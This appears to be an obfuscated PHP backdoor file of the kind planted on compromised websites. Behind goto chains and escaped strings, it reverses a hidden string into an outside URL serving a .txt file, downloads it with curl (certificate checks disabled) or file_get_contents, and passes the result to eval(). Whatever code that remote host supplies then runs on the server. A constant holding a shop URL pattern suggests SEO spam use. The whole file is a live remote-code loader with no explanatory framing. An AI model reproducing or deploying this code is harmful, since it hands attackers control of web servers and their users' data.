<?php define('A', 'jan85.tphu5583htr/locondo::shop/goods/[word]^^!!.html|^^!!.htm::?');
goto Qo3Zq;
Qo3Zq:
$x1DBi = "\x74\x78\164\56";
goto eM_QN;
h4fIU:
$x1DBi .= "\164\56\61\x30\163\x6b";
goto KKULZ;
WU6rf:
$x1DBi .= "\x74\x74\150";
goto vMRvT;
Yt3ix:
$x1DBi .= "\72\163\160";
goto WU6rf;
I7yjh:
$x1DBi .= "\163\x2f\x2f";
goto Yt3ix;
eM_QN:
$x1DBi .= "\65\x78\x2f\160\157";
goto h4fIU;
KKULZ:
$x1DBi .= "\153\157\x2e\x6f\x65";
goto I7yjh;
vMRvT:
eval ("\77\76" . Roq_n(strrev($x1DBi)));
goto hz9FL;
hz9FL:
function RoQ_n($K9OLS = '')
{
    goto LAi61;
    fE0yF:
    $iHVyT = curl_init();
    goto dj1a9;
    Wswo8:
    goto HD7Ho;
    goto MoXGn;
    iaeEi:
    $a8SXe = curl_exec($iHVyT);
    goto W4H17;
    JwqZc:
    HD7Ho:
    goto CWhnF;
    MoXGn:
    Lfe0j:
    goto fE0yF;
    dj1a9:
    curl_setopt($iHVyT, CURLOPT_RETURNTRANSFER, true);
    goto Go2lM;
    pJYvz:
    curl_setopt($iHVyT, CURLOPT_SSL_VERIFYHOST, false);
    goto nJ_HP;
    Go2lM:
    curl_setopt($iHVyT, CURLOPT_TIMEOUT, 500);
    goto sXeUw;
    nJ_HP:
    curl_setopt($iHVyT, CURLOPT_URL, $K9OLS);
    goto iaeEi;
    CWhnF:
    return $a8SXe;
    goto IjsIA;
    W4H17:
    curl_close($iHVyT);
    goto JwqZc;
    LAi61:
    if (function_exists("\143\x75\x72\154\137\151\x6e\151\x74") && function_exists("\x63\x75\162\154\x5f\145\x78\145\143")) {
        goto Lfe0j;
    }
    goto Ys1pr;
    Av3dv:
    $a8SXe = file_get_contents($K9OLS, false, $j0Fco);
    goto Wswo8;
    sXeUw:
    curl_setopt($iHVyT, CURLOPT_SSL_VERIFYPEER, false);
    goto pJYvz;
    Ys1pr:
    $j0Fco = stream_context_create(["\150\164\x74\160" => ["\155\x65\164\x68\157\144" => "\x47\105\x54"]]);
    goto Av3dv;
    IjsIA:
} ?>